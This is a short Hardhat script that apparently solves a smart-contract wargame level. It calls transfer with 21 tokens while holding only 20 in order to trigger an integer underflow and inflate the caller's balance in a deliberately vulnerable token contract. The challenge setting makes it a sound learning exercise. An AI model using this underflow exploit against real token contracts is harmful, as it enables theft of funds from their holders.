import { ethers } from "hardhat";
import { Token__factory } from "../typechain-types";

async function main() {
  // The goal of this level is for you to hack the basic token contract below.
  // You are given 20 tokens to start with and you will beat the level if
  // you somehow manage to get your hands on any additional tokens.
  // Preferably a very large amount of tokens.

  let tx; // will have to wait for each tx
  let [deployer] = await ethers.getSigners();
  let contract = "0xf7dda52Ceb147e73537738D1B661fDe81eE174A6";
  let token = new Token__factory(deployer).attach(contract);

  tx = await token.transfer(contract, 21, {
    gasLimit: 100_000,
  });
  await tx.wait();
  console.log(+(await token.balanceOf(deployer.address)));
}

// We recommend this pattern to be able to use async/await everywhere
// and properly handle errors.
main().catch((error) => {
  console.error(error);
  process.exitCode = 1;
});
